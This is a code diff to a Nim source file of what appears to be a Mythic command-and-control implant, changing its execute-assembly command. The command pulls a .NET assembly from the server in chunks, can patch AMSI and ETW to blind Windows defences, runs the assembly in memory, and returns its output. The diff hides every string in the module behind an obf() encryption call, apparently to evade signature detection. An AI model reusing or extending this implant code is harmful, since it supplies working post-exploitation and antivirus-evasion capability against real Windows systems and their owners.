@@ -1,4 +1,5 @@
 import json
+import ../utils/strenc
 
 when defined(windows):
   import base64
@@ -21,10 +22,10 @@ proc executeAssembly*(taskId: string, params: JsonNode): JsonNode =
   ## First response - request the file from Mythic
   when not defined(windows):
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "execute-assembly is only supported on Windows"
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("execute-assembly is only supported on Windows")
     }
   else:
     try:
@@ -32,20 +33,20 @@ proc executeAssembly*(taskId: string, params: JsonNode): JsonNode =
       
       # Step 1: Request the assembly file from Mythic
       return %*{
-        "task_id": taskId,
-        "upload": {
-          "file_id": args.uuid,
-          "chunk_num": 1,
-          "chunk_size": CHUNK_SIZE,
-          "full_path": ""
+        obf("task_id"): taskId,
+        obf("upload"): {
+          obf("file_id"): args.uuid,
+          obf("chunk_num"): 1,
+          obf("chunk_size"): CHUNK_SIZE,
+          obf("full_path"): ""
         }
       }
     except Exception as e:
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Failed to parse execute-assembly parameters: " & e.msg
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Failed to parse execute-assembly parameters: ") & e.msg
       }
 
 proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: string, 
@@ -64,17 +65,17 @@ proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: s
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
         return %*{
-          "task_id": taskId,
-          "upload": {
-            "chunk_size": CHUNK_SIZE,
-            "file_id": args.uuid,
-            "chunk_num": currentChunk + 1,
-            "full_path": ""
+          obf("task_id"): taskId,
+          obf("upload"): {
+            obf("chunk_size"): CHUNK_SIZE,
+            obf("file_id"): args.uuid,
+            obf("chunk_num"): currentChunk + 1,
+            obf("full_path"): ""
           }
         }
       
       # All chunks received - execute the assembly
-      var output = "Executing .NET assembly from memory...\n"
+      var output = obf("Executing .NET assembly from memory...\n")
       
       # Apply patches if requested
       if args.patch_amsi_arg:
@@ -93,16 +94,16 @@ proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: s
         let res = patchETW()
         case res
         of 0:
-          output.add("[+] ETW patched successfully!\n")
+          output.add(obf("[+] ETW patched successfully!\n"))
         of 1:
-          output.add("[-] Failed to patch ETW\n")
+          output.add(obf("[-] Failed to patch ETW\n"))
         of 2:
-          output.add("[+] ETW already patched\n")
+          output.add(obf("[+] ETW already patched\n"))
         else:
           discard
       
       # Load the assembly
-      output.add("[*] Loading assembly...\n")
+      output.add(obf("[*] Loading assembly...\n"))
       let assembly = load(fileData)
       
       # Parse arguments
@@ -126,13 +127,13 @@ proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: s
       # Convert arguments to CLR variant array
       var arr = toCLRVariant(assemblyArgs, VT_BSTR)
       
-      output.add("[*] Executing assembly...\n")
+      output.add(obf("[*] Executing assembly...\n"))
       
       # Redirect Console.WriteLine output
-      let mscor = load("mscorlib")
-      let io = load("System.IO")
-      let Console = mscor.GetType("System.Console")
-      let StringWriter = io.GetType("System.IO.StringWriter")
+      let mscor = load(obf("mscorlib"))
+      let io = load(obf("System.IO"))
+      let Console = mscor.GetType(obf("System.Console"))
+      let StringWriter = io.GetType(obf("System.IO.StringWriter"))
       
       var sw = @StringWriter.new()
       var oldConsOut = @Console.Out
@@ -146,30 +147,30 @@ proc processExecuteAssemblyChunk*(taskId: string, params: JsonNode, chunkData: s
       let executionOutput = fromCLRVariant[string](sw.ToString())
       
       if executionOutput.len > 0:
-        output.add("\n=== Assembly Output ===\n")
+        output.add(obf("\n=== Assembly Output ===\n"))
         output.add(executionOutput)
-        output.add("\n======================\n")
+        output.add(obf("\n======================\n"))
       
-      output.add("[+] Assembly execution completed\n")
+      output.add(obf("[+] Assembly execution completed\n"))
       
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "success",
-        "user_output": output
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): obf("success"),
+        obf("user_output"): output
       }
       
     except Exception as e:
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Failed to execute assembly: " & e.msg
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Failed to execute assembly: ") & e.msg
       }
   else:
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "execute-assembly is only supported on Windows"
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("execute-assembly is only supported on Windows")
     }
